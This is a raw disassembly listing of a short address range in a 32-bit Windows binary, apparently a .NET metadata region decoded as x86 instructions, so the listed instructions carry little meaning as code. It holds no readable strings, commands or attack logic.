  403be9:	00 7d 04             	add    %bh,0x4(%ebp)
  403bec:	d7                   	xlat   %ds:(%ebx)
  403bed:	08 06                	or     %al,(%esi)
  403bef:	00 d7                	add    %dl,%bh
  403bf1:	05 73 0b 06 00       	add    $0x60b73,%eax
  403bf6:	f8                   	clc
  403bf7:	00 6d 0c             	add    %ch,0xc(%ebp)
  403bfa:	06                   	push   %es
  403bfb:	00 4c 08 6d          	add    %cl,0x6d(%eax,%ecx,1)
  403bff:	0c 0e                	or     $0xe,%al
  403c01:	00 e8                	add    %ch,%al
  403c03:	0c 91                	or     $0x91,%al
  403c05:	0c 0e                	or     $0xe,%al
  403c07:	00 30                	add    %dh,(%eax)
  403c09:	09 91 0c 06 00 59    	or     %edx,0x5900060c(%ecx)
  403c0f:	0c d7                	or     $0xd7,%al
  403c11:	08 06                	or     %al,(%esi)
  403c13:	00 87 09 d7 08 16    	add    %al,0x1608d709(%edi)
  403c19:	00 12                	add    %dl,(%edx)
  403c1b:	0a e7                	or     %bh,%ah
  403c1d:	07                   	pop    %es
  403c1e:	06                   	push   %es
  403c1f:	00 c2                	add    %al,%dl
  403c21:	08 d1                	or     %dl,%cl
  403c23:	02 16                	add    (%esi),%dl
  403c25:	00 1f                	add    %bl,(%edi)
  403c27:	0b e7                	or     %edi,%esp
  403c29:	07                   	pop    %es
  403c2a:	06                   	push   %es
  403c2b:	00 93 0e 8e 09 06    	add    %dl,0x6098e0e(%ebx)
  403c31:	00 fb                	add    %bh,%bl
  403c33:	09 8e 09 06 00 5d    	or     %ecx,0x5d000609(%esi)
  403c39:	04 d7                	add    $0xd7,%al
  403c3b:	08 06                	or     %al,(%esi)
  403c3d:	00 2d 04 73 0b 06    	add    %ch,0x60b7304
  403c43:	00 bb 0a 73 0b 06    	add    %bh,0x60b730a(%ebx)
  403c49:	00 e1                	add    %ah,%cl
  403c4b:	09 d7                	or     %edx,%edi
  403c4d:	08 06                	or     %al,(%esi)
  403c4f:	00 4c 0a 73          	add    %cl,0x73(%edx,%ecx,1)
  403c53:	0b 06                	or     (%esi),%eax
  403c55:	00 26                	add    %ah,(%esi)
  403c57:	06                   	push   %es
  403c58:	41                   	inc    %ecx
  403c59:	0b 06                	or     (%esi),%eax
  403c5b:	00 18                	add    %bl,(%eax)
  403c5d:	01 73 0b             	add    %esi,0xb(%ebx)
  403c60:	06                   	push   %es
  403c61:	00 ff                	add    %bh,%bh
  403c63:	00 73 0b             	add    %dh,0xb(%ebx)
  403c66:	06                   	push   %es
  403c67:	00 35 0a 73 0b 0e    	add    %dh,0xe0b730a
  403c6d:	00 44 09 91          	add    %al,-0x6f(%ecx,%ecx,1)
  403c71:	0c 06                	or     $0x6,%al
  403c73:	00 c6                	add    %al,%dh
  403c75:	03 d7                	add    %edi,%edx
  403c77:	08 0a                	or     %cl,(%edx)
  403c79:	00 c0                	add    %al,%al
  403c7b:	04 5d                	add    $0x5d,%al
  403c7d:	09 06                	or     %eax,(%esi)
  403c7f:	00 ba 03 d7 08 0a    	add    %bh,0xa08d703(%edx)
  403c85:	00 b1 0a 60 08 0e    	add    %dh,0xe08600a(%ecx)
  403c8b:	00 ba 08 91 0c ff    	add    %bh,-0xf36ef8(%edx)
  403c91:	00 a0 09 00 00 0e    	add    %ah,0xe000009(%eax)
  403c97:	00 ef                	add    %ch,%bh
  403c99:	03 91 0c 16 00 e0    	add    -0x1fffe9f4(%ecx),%edx
  403c9f:	0d e7 07 16 00       	or     $0x1607e7,%eax
  403ca4:	8e 07                	mov    (%edi),%es
  403ca6:	e7 07                	out    %eax,$0x7
  403ca8:	0e                   	push   %cs
  403ca9:	00 2d 0c 91 0c 12    	add    %ch,0x120c910c
  403caf:	00 73 04             	add    %dh,0x4(%ebx)
  403cb2:	b8 0c 16 00 ea       	mov    $0xea00160c,%eax
  403cb7:	0d e7 07 16 00       	or     $0x1607e7,%eax
  403cbc:	0d 04 e7 07 06       	or     $0x607e704,%eax
  403cc1:	00 8b 0a d7 08 16    	add    %cl,0x1608d70a(%ebx)
  403cc7:	00 ce                	add    %cl,%dh
  403cc9:	0d 27 0e 0e 00       	or     $0xe0e27,%eax
  403cce:	9f                   	lahf
  403ccf:	08 91 0c 16 00 c5    	or     %dl,-0x3affe9f4(%ecx)
  403cd5:	02 e7                	add    %bh,%ah
  403cd7:	07                   	pop    %es
  403cd8:	0e                   	push   %cs
  403cd9:	00 91 03 91 0c 0e    	add    %dl,0xe0c9103(%ecx)
  403cdf:	00 fd                	add    %bh,%ch
  403ce1:	03 91 0c 0e 00 c4    	add    -0x3bfff1f4(%ecx),%edx
  403ce7:	09 91 0c 06 00 dc    	or     %edx,-0x23fff9f4(%ecx)
  403ced:	04 d7                	add    $0xd7,%al
  403cef:	08 06                	or     %al,(%esi)
  403cf1:	00 c8                	add    %cl,%al
  403cf3:	08 d1                	or     %dl,%cl
  403cf5:	02 16                	add    (%esi),%dl
  403cf7:	00 9f 03 e7 07 06    	add    %bl,0x607e703(%edi)
  403cfd:	00 43 0c             	add    %al,0xc(%ebx)
  403d00:	8e 09                	mov    (%ecx),%cs
  403d02:	06                   	push   %es
  403d03:	00 aa 04 8e 09 06    	add    %ch,0x6098e04(%edx)
  403d09:	00 ea                	add    %ch,%dl
  403d0b:	03 d1                	add    %ecx,%edx
  403d0d:	02 06                	add    (%esi),%al
  403d0f:	00 f1                	add    %dh,%cl
  403d11:	00 d7                	add    %dl,%bh
  403d13:	08 06                	or     %al,(%esi)
  403d15:	00 07                	add    %al,(%edi)
  403d17:	09 d7                	or     %edx,%edi
  403d19:	08 06                	or     %al,(%esi)
  403d1b:	00 f6                	add    %dh,%dh
  403d1d:	07                   	pop    %es
  403d1e:	d1 02                	roll   $1,(%edx)
  403d20:	0e                   	push   %cs
  403d21:	00 56 0e             	add    %dl,0xe(%esi)
  403d24:	91                   	xchg   %eax,%ecx
  403d25:	0c 0e                	or     $0xe,%al
  403d27:	00 85 0d 91 0c 00    	add    %al,0xc910d(%ebp)
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	00 b6 02 00 00 00    	add    %dh,0x2(%esi)
  403d35:	00 01                	add    %al,(%ecx)
  403d37:	00 01                	add    %al,(%ecx)
  403d39:	00 80 01 10 00 cf    	add    %al,-0x30ffefff(%eax)
  403d3f:	08 74 01 41          	or     %dh,0x41(%ecx,%eax,1)
  403d43:	00 01                	add    %al,(%ecx)
  403d45:	00 01                	add    %al,(%ecx)
  403d47:	00 00                	add    %al,(%eax)
  403d49:	00 10                	add    %dl,(%eax)
  403d4b:	00 9a 0b fe 0b 41    	add    %bl,0x410bfe0b(%edx)
  403d51:	00 01                	add    %al,(%ecx)
  403d53:	00 02                	add    %al,(%edx)
  403d55:	00 00                	add    %al,(%eax)
  403d57:	01 10                	add    %edx,(%eax)
  403d59:	00 50 0c             	add    %dl,0xc(%eax)
  403d5c:	fe 0b                	decb   (%ebx)
  403d5e:	65 00 03             	add    %al,%gs:(%ebx)
  403d61:	00 06                	add    %al,(%esi)
  403d63:	00 01                	add    %al,(%ecx)
  403d65:	00 10                	add    %dl,(%eax)
  403d67:	00 63 01             	add    %ah,0x1(%ebx)
  403d6a:	2a 0a                	sub    (%edx),%cl
  403d6c:	69 00 04 00 09 00    	imul   $0x90004,(%eax),%eax
  403d72:	03 21                	add    (%ecx),%esp
  403d74:	10 00                	adc    %al,(%eax)
  403d76:	01 03                	add    %eax,(%ebx)
  403d78:	00 00                	add    %al,(%eax)
  403d7a:	41                   	inc    %ecx
  403d7b:	00 0f                	add    %cl,(%edi)
  403d7d:	00 16                	add    %dl,(%esi)
  403d7f:	00 03                	add    %al,(%ebx)
  403d81:	01 10                	add    %edx,(%eax)
  403d83:	00 01                	add    %al,(%ecx)
  403d85:	00 00                	add    %al,(%eax)
  403d87:	00 41 00             	add    %al,0x0(%ecx)
  403d8a:	11 00                	adc    %eax,(%eax)
  403d8c:	19 00                	sbb    %eax,(%eax)
  403d8e:	03 01                	add    (%ecx),%eax
  403d90:	10 00                	adc    %al,(%eax)
  403d92:	16                   	push   %ss
  403d93:	00 00                	add    %al,(%eax)
  403d95:	00 41 00             	add    %al,0x0(%ecx)
  403d98:	12 00                	adc    (%eax),%al
  403d9a:	1b 00                	sbb    (%eax),%eax
  403d9c:	03 01                	add    (%ecx),%eax
  403d9e:	10 00                	adc    %al,(%eax)
  403da0:	2b 00                	sub    (%eax),%eax
  403da2:	00 00                	add    %al,(%eax)
  403da4:	41                   	inc    %ecx
  403da5:	00 13                	add    %dl,(%ebx)
  403da7:	00 1d 00 03 01 10    	add    %bl,0x10010300
  403dad:	00 40 00             	add    %al,0x0(%eax)
  403db0:	00 00                	add    %al,(%eax)
  403db2:	41                   	inc    %ecx
  403db3:	00 15 00 1f 00 03    	add    %dl,0x3001f00
  403db9:	01 10                	add    %edx,(%eax)
  403dbb:	00 55 00             	add    %dl,0x0(%ebp)
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	41                   	inc    %ecx
  403dc1:	00 1a                	add    %bl,(%edx)
  403dc3:	00 21                	add    %ah,(%ecx)
  403dc5:	00 03                	add    %al,(%ebx)
  403dc7:	01 10                	add    %edx,(%eax)
  403dc9:	00 de                	add    %bl,%dh
  403dcb:	00 00                	add    %al,(%eax)
  403dcd:	00 c5                	add    %al,%ch
  403dcf:	00 1b                	add    %bl,(%ebx)
  403dd1:	00 23                	add    %ah,(%ebx)
  403dd3:	00 03                	add    %al,(%ebx)
  403dd5:	01 10                	add    %edx,(%eax)
  403dd7:	00 23                	add    %ah,(%ebx)
  403dd9:	02 00                	add    (%eax),%al
  403ddb:	00 c5                	add    %al,%ch
  403ddd:	00 1f                	add    %bl,(%edi)
  403ddf:	00 25 00 03 01 10    	add    %ah,0x10010300
  403de5:	00 5c 02 00          	add    %bl,0x0(%edx,%eax,1)
  403de9:	00 c5                	add    %al,%ch
  403deb:	00 26                	add    %ah,(%esi)
  403ded:	00 27                	add    %ah,(%edi)
  403def:	00 03                	add    %al,(%ebx)
  403df1:	01 10                	add    %edx,(%eax)
  403df3:	00 81 02 00 00 c5    	add    %al,-0x3afffffe(%ecx)
  403df9:	00 2a                	add    %ch,(%edx)
  403dfb:	00 29                	add    %ch,(%ecx)
  403dfd:	00 03                	add    %al,(%ebx)
  403dff:	01 10                	add    %edx,(%eax)
  403e01:	00 aa 02 00 00 c5    	add    %ch,-0x3afffffe(%edx)
  403e07:	00 33                	add    %dh,(%ebx)
  403e09:	00 2b                	add    %ch,(%ebx)
  403e0b:	00 03                	add    %al,(%ebx)
  403e0d:	01 10                	add    %edx,(%eax)
  403e0f:	00 d5                	add    %dl,%ch
  403e11:	01 00                	add    %eax,(%eax)
  403e13:	00 c5                	add    %al,%ch
  403e15:	00 37                	add    %dh,(%edi)
  403e17:	00 2d 00 03 01 10    	add    %ch,0x10010300
  403e1d:	00 4a 02             	add    %cl,0x2(%edx)
  403e20:	00 00                	add    %al,(%eax)
  403e22:	c5 00                	lds    (%eax),%eax
  403e24:	3b 00                	cmp    (%eax),%eax
  403e26:	2f                   	das
  403e27:	00 03                	add    %al,(%ebx)
  403e29:	01 10                	add    %edx,(%eax)
  403e2b:	00 8d 02 00 00 c5    	add    %cl,-0x3afffffe(%ebp)
  403e31:	00 43 00             	add    %al,0x0(%ebx)
  403e34:	31 00                	xor    %eax,(%eax)
  403e36:	03 01                	add    (%ecx),%eax
  403e38:	10 00                	adc    %al,(%eax)
  403e3a:	68 02 00 00 c5       	push   $0xc5000002
  403e3f:	00 47 00             	add    %al,0x0(%edi)
  403e42:	33 00                	xor    (%eax),%eax
  403e44:	03 01                	add    (%ecx),%eax
  403e46:	10 00                	adc    %al,(%eax)
  403e48:	14 03                	adc    $0x3,%al
  403e4a:	00 00                	add    %al,(%eax)
  403e4c:	c5 00                	lds    (%eax),%eax
  403e4e:	4b                   	dec    %ebx
  403e4f:	00 35 00 03 01 10    	add    %dh,0x10010300
  403e55:	00 05 03 00 00 c5    	add    %al,0xc5000003
  403e5b:	00 4f 00             	add    %cl,0x0(%edi)
  403e5e:	37                   	aaa
  403e5f:	00 11                	add    %dl,(%ecx)
  403e61:	00 f6                	add    %dh,%dh
  403e63:	08 f0                	or     %dh,%al
  403e65:	03 11                	add    (%ecx),%edx
  403e67:	00 9a 04 f4 03 11    	add    %bl,0x1103f404(%edx)
  403e6d:	00 7d 03             	add    %bh,0x3(%ebp)
  403e70:	f8                   	clc
  403e71:	03 01                	add    (%ecx),%eax
  403e73:	00 16                	add    %dl,(%esi)
  403e75:	0d fc 03 01 00       	or     $0x103fc,%eax
  403e7a:	36 01 00             	add    %eax,%ss:(%eax)
  403e7d:	04 01                	add    $0x1,%al
  403e7f:	00 85 01 04 04 01    	add    %al,0x1040401(%ebp)
  403e85:	00 f4                	add    %dh,%ah
  403e87:	01 08                	add    %ecx,(%eax)
  403e89:	04 01                	add    $0x1,%al
  403e8b:	00 26                	add    %ah,(%esi)
  403e8d:	01 0c 04             	add    %ecx,(%esp,%eax,1)
  403e90:	01 00                	add    %eax,(%eax)
  403e92:	54                   	push   %esp
  403e93:	01 10                	add    %edx,(%eax)
  403e95:	04 01                	add    $0x1,%al
  403e97:	00 97 01 15 04 01    	add    %dl,0x1041501(%edi)
  403e9d:	00 e8                	add    %ch,%al
  403e9f:	01 00                	add    %eax,(%eax)
  403ea1:	04 01                	add    $0x1,%al
  403ea3:	00 0c 02             	add    %cl,(%edx,%eax,1)
  403ea6:	1a 04 01             	sbb    (%ecx,%eax,1),%al
  403ea9:	00 a7 01 1a 04 01    	add    %ah,0x1041a01(%edi)
  403eaf:	00 42 01             	add    %al,0x1(%edx)
  403eb2:	1f                   	pop    %ds
  403eb3:	04 36                	add    $0x36,%al
  403eb5:	00 a6 02 24 04 16    	add    %ah,0x16042402(%esi)
  403ebb:	00 c0                	add    %al,%al
  403ebd:	00 28                	add    %ch,(%eax)
  403ebf:	04 06                	add    $0x6,%al
  403ec1:	00 20                	add    %ah,(%eax)
  403ec3:	04 2d                	add    $0x2d,%al
  403ec5:	04 06                	add    $0x6,%al
  403ec7:	00 a5 03 30 04 06    	add    %ah,0x6043003(%ebp)
  403ecd:	00 63 0c             	add    %ah,0xc(%ebx)
  403ed0:	34 04                	xor    $0x4,%al
  403ed2:	06                   	push   %es
  403ed3:	00 f2                	add    %dh,%dl
  403ed5:	08 38                	or     %bh,(%eax)
  403ed7:	04 06                	add    $0x6,%al
  403ed9:	00 63 0c             	add    %ah,0xc(%ebx)
  403edc:	34 04                	xor    $0x4,%al
  403ede:	06                   	push   %es
  403edf:	00 ab 03 2d 04 06    	add    %ch,0x6042d03(%ebx)
  403ee5:	00 d6                	add    %dl,%dh
  403ee7:	09 2d 04 06 00 fa    	or     %ebp,0xfa000604
  403eed:	0c 3b                	or     $0x3b,%al
  403eef:	04 06                	add    $0x6,%al
  403ef1:	00 3f                	add    %bh,(%edi)
  403ef3:	09 40 04             	or     %eax,0x4(%eax)
  403ef6:	06                   	push   %es
  403ef7:	00 39                	add    %bh,(%ecx)
  403ef9:	0d 2d 04 06 00       	or     $0x6042d,%eax
  403efe:	fa                   	cli
  403eff:	04 38                	add    $0x38,%al
  403f01:	04 06                	add    $0x6,%al
  403f03:	00 63 0a             	add    %ah,0xa(%ebx)
  403f06:	45                   	inc    %ebp
  403f07:	04 06                	add    $0x6,%al
  403f09:	00 20                	add    %ah,(%eax)
  403f0b:	04 2d                	add    $0x2d,%al
  403f0d:	04 01                	add    $0x1,%al
  403f0f:	00 ea                	add    %ch,%dl
  403f11:	00 4e 04             	add    %cl,0x4(%esi)
  403f14:	06                   	push   %es
  403f15:	00 fa                	add    %bh,%dl
  403f17:	04 38                	add    $0x38,%al
  403f19:	04 06                	add    $0x6,%al
  403f1b:	00 63 0a             	add    %ah,0xa(%ebx)
  403f1e:	57                   	push   %edi
  403f1f:	04 06                	add    $0x6,%al
  403f21:	00 63 0c             	add    %ah,0xc(%ebx)
  403f24:	34 04                	xor    $0x4,%al
  403f26:	06                   	push   %es
  403f27:	00 f2                	add    %dh,%dl
  403f29:	08 38                	or     %bh,(%eax)
  403f2b:	04 01                	add    $0x1,%al
  403f2d:	00 d7                	add    %dl,%bh
  403f2f:	00 5c 04 01          	add    %bl,0x1(%esp,%eax,1)
  403f33:	00 ea                	add    %ch,%dl
  403f35:	00 60 04             	add    %ah,0x4(%eax)
  403f38:	01 00                	add    %eax,(%eax)
  403f3a:	cd 01                	int    $0x1
  403f3c:	38 04 06             	cmp    %al,(%esi,%eax,1)
  403f3f:	00 fa                	add    %bh,%dl
  403f41:	04 38                	add    $0x38,%al
  403f43:	04 06                	add    $0x6,%al
  403f45:	00 63 0a             	add    %ah,0xa(%ebx)
  403f48:	65 04 06             	gs add $0x6,%al
  403f4b:	00 39                	add    %bh,(%ecx)
  403f4d:	0d 2d 04 01 00       	or     $0x1042d,%eax
  403f52:	ea 00 6d 04 06 00 fa 	ljmp   $0xfa00,$0x6046d00
  403f59:	04 38                	add    $0x38,%al
  403f5b:	04 06                	add    $0x6,%al
  403f5d:	00 63 0a             	add    %ah,0xa(%ebx)
  403f60:	57                   	push   %edi
  403f61:	04 06                	add    $0x6,%al
  403f63:	00 63 0c             	add    %ah,0xc(%ebx)
  403f66:	34 04                	xor    $0x4,%al
  403f68:	01 00                	add    %eax,(%eax)
  403f6a:	69 01 75 04 01 00    	imul   $0x10475,(%ecx),%eax
  403f70:	01 02                	add    %eax,(%edx)
  403f72:	38 04 01             	cmp    %al,(%ecx,%eax,1)
  403f75:	00 3c 02             	add    %bh,(%edx,%eax,1)
  403f78:	2d 04 01 00 ea       	sub    $0xea000104,%eax
  403f7d:	00 60 04             	add    %ah,0x4(%eax)
  403f80:	01 00                	add    %eax,(%eax)
  403f82:	e1 01                	loope  0x403f85
  403f84:	6d                   	insl   (%dx),%es:(%edi)
  403f85:	04 01                	add    $0x1,%al
  403f87:	00 2f                	add    %ch,(%edi)
  403f89:	02 4e 04             	add    0x4(%esi),%cl
  403f8c:	06                   	push   %es
  403f8d:	00 fa                	add    %bh,%dl
  403f8f:	04 38                	add    $0x38,%al
  403f91:	04 06                	add    $0x6,%al
  403f93:	00 63 0a             	add    %ah,0xa(%ebx)
  403f96:	57                   	push   %edi
  403f97:	04 06                	add    $0x6,%al
  403f99:	00 63 0c             	add    %ah,0xc(%ebx)
  403f9c:	34 04                	xor    $0x4,%al
  403f9e:	01 00                	add    %eax,(%eax)
  403fa0:	ea 00 60 04 06 00 fa 	ljmp   $0xfa00,$0x6046000
  403fa7:	04 38                	add    $0x38,%al
  403fa9:	04 06                	add    $0x6,%al
  403fab:	00 63 0a             	add    %ah,0xa(%ebx)
  403fae:	57                   	push   %edi
  403faf:	04 06                	add    $0x6,%al
  403fb1:	00 a5 03 30 04 01    	add    %ah,0x1043003(%ebp)
  403fb7:	00 ea                	add    %ch,%dl
  403fb9:	00 60 04             	add    %ah,0x4(%eax)
  403fbc:	06                   	push   %es
  403fbd:	00 fa                	add    %bh,%dl
  403fbf:	04 38                	add    $0x38,%al
  403fc1:	04 06                	add    $0x6,%al
  403fc3:	00 63 0a             	add    %ah,0xa(%ebx)
  403fc6:	57                   	push   %edi
  403fc7:	04 06                	add    $0x6,%al
  403fc9:	00 63 0c             	add    %ah,0xc(%ebx)
  403fcc:	34 04                	xor    $0x4,%al
  403fce:	06                   	push   %es
  403fcf:	00 ab 03 2d 04 06    	add    %ch,0x6042d03(%ebx)
  403fd5:	00 d6                	add    %dl,%dh
  403fd7:	09 2d 04 06 00 fa    	or     %ebp,0xfa000604
  403fdd:	0c 3b                	or     $0x3b,%al
  403fdf:	04 06                	add    $0x6,%al
  403fe1:	00 3f                	add    %bh,(%edi)
  403fe3:	09 40 04             	or     %eax,0x4(%eax)
  403fe6:	01 00                	add    %eax,(%eax)
  403fe8:	ea 00 60 04 06 00 fa 	ljmp   $0xfa00,$0x6046000
  403fef:	04 38                	add    $0x38,%al
  403ff1:	04 06                	add    $0x6,%al
  403ff3:	00 63 0a             	add    %ah,0xa(%ebx)
  403ff6:	78 04                	js     0x403ffc
  403ff8:	06                   	push   %es
  403ff9:	00 63 0c             	add    %ah,0xc(%ebx)
  403ffc:	34 04                	xor    $0x4,%al
  403ffe:	01 00                	add    %eax,(%eax)
  404000:	ea 00 60 04 06 00 fa 	ljmp   $0xfa00,$0x6046000
  404007:	04 38                	add    $0x38,%al
  404009:	04 06                	add    $0x6,%al
  40400b:	00 63 0a             	add    %ah,0xa(%ebx)
  40400e:	78 04                	js     0x404014
  404010:	06                   	push   %es
  404011:	00 63 0c             	add    %ah,0xc(%ebx)
  404014:	34 04                	xor    $0x4,%al
  404016:	01 00                	add    %eax,(%eax)
  404018:	ea 00 60 04 06 00 fa 	ljmp   $0xfa00,$0x6046000
  40401f:	04 38                	add    $0x38,%al
  404021:	04 06                	add    $0x6,%al
  404023:	00 63 0a             	add    %ah,0xa(%ebx)
  404026:	57                   	push   %edi
  404027:	04 06                	add    $0x6,%al
  404029:	00 63 0c             	add    %ah,0xc(%ebx)
  40402c:	5c                   	pop    %esp
  40402d:	04 01                	add    $0x1,%al
  40402f:	00 ea                	add    %ch,%dl
  404031:	00 60 04             	add    %ah,0x4(%eax)
  404034:	06                   	push   %es
  404035:	00 fa                	add    %bh,%dl
  404037:	04 38                	add    $0x38,%al
  404039:	04 06                	add    $0x6,%al
  40403b:	00 63 0a             	add    %ah,0xa(%ebx)
  40403e:	57                   	push   %edi
  40403f:	04 06                	add    $0x6,%al
  404041:	00 63 0c             	add    %ah,0xc(%ebx)
  404044:	7d 04                	jge    0x40404a
  404046:	01 00                	add    %eax,(%eax)
  404048:	ea 00 60 04 50 20 00 	ljmp   $0x20,$0x50046000
  40404f:	00 00                	add    %al,(%eax)
  404051:	00 91 00 02 09 34    	add    %dl,0x34090200(%ecx)
  404057:	00 01                	add    %al,(%ecx)
  404059:	00 67 20             	add    %ah,0x20(%edi)
  40405c:	00 00                	add    %al,(%eax)
  40405e:	00 00                	add    %al,(%eax)
  404060:	83 18 34             	sbbl   $0x34,(%eax)
  404063:	0b 06                	or     (%esi),%eax
  404065:	00 01                	add    %al,(%ecx)
  404067:	00 6f 20             	add    %ch,0x20(%edi)
  40406a:	00 00                	add    %al,(%eax)
  40406c:	00 00                	add    %al,(%eax)
  40406e:	93                   	xchg   %eax,%ebx
  40406f:	08 77 0a             	or     %dh,0xa(%edi)
  404072:	81 04 01 00 9b 20 00 	addl   $0x209b00,(%ecx,%eax,1)
  404079:	00 00                	add    %al,(%eax)
  40407b:	00 93 08 82 04 86    	add    %dl,-0x79fb7df8(%ebx)
  404081:	04 01                	add    $0x1,%al
  404083:	00 a2 20 00 00 00    	add    %ah,0x20(%edx)
  404089:	00 93 08 8e 04 8b    	add    %dl,-0x74fb71f8(%ebx)
  40408f:	04 01                	add    $0x1,%al
  404091:	00 aa 20 00 00 00    	add    %ch,0x20(%edx)
  404097:	00 96 08 57 0d 91    	add    %dl,-0x6ef2a8f8(%esi)
  40409d:	04 02                	add    $0x2,%al
  40409f:	00 b1 20 00 00 00    	add    %dh,0x20(%ecx)
  4040a5:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  4040ab:	00 02                	add    %al,(%edx)
  4040ad:	00 b9 20 00 00 00    	add    %bh,0x20(%ecx)
  4040b3:	00 91 18 3a 0b 34    	add    %dl,0x340b3a18(%ecx)
  4040b9:	00 02                	add    %al,(%edx)
  4040bb:	00 cf                	add    %cl,%bh
  4040bd:	20 00                	and    %al,(%eax)
  4040bf:	00 00                	add    %al,(%eax)
  4040c1:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  4040c7:	00 02                	add    %al,(%edx)
  4040c9:	00 e0                	add    %ah,%al
  4040cb:	20 00                	and    %al,(%eax)
  4040cd:	00 00                	add    %al,(%eax)
  4040cf:	00 81 00 ba 00 96    	add    %al,-0x69ff4600(%ecx)
  4040d5:	04 02                	add    $0x2,%al
  4040d7:	00 24 21             	add    %ah,(%ecx,%eiz,1)
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	81 00 b4 00 a1 04    	addl   $0x4a100b4,(%eax)
  4040e4:	03 00                	add    (%eax),%eax
  4040e6:	68 21 00 00 00       	push   $0x21
  4040eb:	00 81 00 be 01 a9    	add    %al,-0x56fe4200(%ecx)
  4040f1:	04 04                	add    $0x4,%al
  4040f3:	00 b4 21 00 00 00 00 	add    %dh,0x0(%ecx,%eiz,1)
  4040fa:	81 00 b8 01 b0 04    	addl   $0x4b001b8,(%eax)
  404100:	05 00 18 22 00       	add    $0x221800,%eax
  404105:	00 00                	add    %al,(%eax)
  404107:	00 81 00 1d 02 be    	add    %al,-0x41fde300(%ecx)
  40410d:	04 09                	add    $0x9,%al
  40410f:	00 5c 22 00          	add    %bl,0x0(%edx,%eiz,1)
  404113:	00 00                	add    %al,(%eax)
  404115:	00 81 00 22 08 c8    	add    %al,-0x37f7de00(%ecx)
  40411b:	04 0a                	add    $0xa,%al
  40411d:	00 94 22 00 00 00 00 	add    %dl,0x0(%edx,%eiz,1)
  404124:	81 00 36 02 a1 00    	addl   $0xa10236,(%eax)
  40412a:	0c 00                	or     $0x0,%al
  40412c:	d8 22                	fsubs  (%edx)
  40412e:	00 00                	add    %al,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	81 00 0f 08 c8 04    	addl   $0x4c8080f,(%eax)
  404138:	0c 00                	or     $0x0,%al
  40413a:	10 23                	adc    %ah,(%ebx)
  40413c:	00 00                	add    %al,(%eax)
  40413e:	00 00                	add    %al,(%eax)
  404140:	81 00 56 02 a1 00    	addl   $0xa10256,(%eax)
  404146:	0e                   	push   %cs
  404147:	00 53 23             	add    %dl,0x23(%ebx)
  40414a:	00 00                	add    %al,(%eax)
  40414c:	00 00                	add    %al,(%eax)
  40414e:	c4 00                	les    (%eax),%eax
  404150:	cd 04                	int    $0x4
  404152:	15 00 0e 00 74       	adc    $0x74000e00,%eax
  404157:	23 00                	and    (%eax),%eax
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 81 00 a6 0d 06    	add    %al,0x60da600(%ecx)
  404161:	00 0f                	add    %cl,(%edi)
  404163:	00 f4                	add    %dh,%ah
  404165:	29 00                	sub    %eax,(%eax)
  404167:	00 00                	add    %al,(%eax)
  404169:	00 81 00 6a 00 06    	add    %al,0x6006a00(%ecx)
  40416f:	00 0f                	add    %cl,(%edi)
  404171:	00 2a                	add    %ch,(%edx)
  404173:	2a 00                	sub    (%eax),%al
  404175:	00 00                	add    %al,(%eax)
  404177:	00 91 18 3a 0b 34    	add    %dl,0x340b3a18(%ecx)
  40417d:	00 0f                	add    %cl,(%edi)
  40417f:	00 36                	add    %dh,(%esi)
  404181:	2a 00                	sub    (%eax),%al
  404183:	00 00                	add    %al,(%eax)
  404185:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  40418b:	00 0f                	add    %cl,(%edi)
  40418d:	00 3e                	add    %bh,(%esi)
  40418f:	2a 00                	sub    (%eax),%al
  404191:	00 00                	add    %al,(%eax)
  404193:	00 83 00 c9 00 06    	add    %al,0x600c900(%ebx)
  404199:	00 0f                	add    %cl,(%edi)
  40419b:	00 45 2a             	add    %al,0x2a(%ebp)
  40419e:	00 00                	add    %al,(%eax)
  4041a0:	00 00                	add    %al,(%eax)
  4041a2:	86 18                	xchg   %bl,(%eax)
  4041a4:	34 0b                	xor    $0xb,%al
  4041a6:	06                   	push   %es
  4041a7:	00 0f                	add    %cl,(%edi)
  4041a9:	00 50 2a             	add    %dl,0x2a(%eax)
  4041ac:	00 00                	add    %al,(%eax)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	83 00 84             	addl   $0xffffff84,(%eax)
  4041b3:	00 cf                	add    %cl,%bh
  4041b5:	01 0f                	add    %ecx,(%edi)
  4041b7:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	86 18                	xchg   %bl,(%eax)
  4041c0:	34 0b                	xor    $0xb,%al
  4041c2:	06                   	push   %es
  4041c3:	00 0f                	add    %cl,(%edi)
  4041c5:	00 0c 2b             	add    %cl,(%ebx,%ebp,1)
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	00 00                	add    %al,(%eax)
  4041cc:	83 00 78             	addl   $0x78,(%eax)
  4041cf:	00 06                	add    %al,(%esi)
  4041d1:	00 0f                	add    %cl,(%edi)
  4041d3:	00 90 2b 00 00 00    	add    %dl,0x2b(%eax)
  4041d9:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  4041df:	00 0f                	add    %cl,(%edi)
  4041e1:	00 98 2b 00 00 00    	add    %bl,0x2b(%eax)
  4041e7:	00 83 00 9c 00 a1    	add    %al,-0x5eff6400(%ebx)
  4041ed:	00 0f                	add    %cl,(%edi)
  4041ef:	00 db                	add    %bl,%bl
  4041f1:	2b 00                	sub    (%eax),%eax
  4041f3:	00 00                	add    %al,(%eax)
  4041f5:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  4041fb:	00 0f                	add    %cl,(%edi)
  4041fd:	00 e4                	add    %ah,%ah
  4041ff:	2b 00                	sub    (%eax),%eax
  404201:	00 00                	add    %al,(%eax)
  404203:	00 83 00 90 00 a1    	add    %al,-0x5eff7000(%ebx)
  404209:	00 0f                	add    %cl,(%edi)
  40420b:	00 27                	add    %ah,(%edi)
  40420d:	2c 00                	sub    $0x0,%al
  40420f:	00 00                	add    %al,(%eax)
  404211:	00 86 18 34 0b 06    	add    %al,0x60b3418(%esi)
  404217:	00 0f                	add    %cl,(%edi)
  404219:	00 2f                	add    %ch,(%edi)
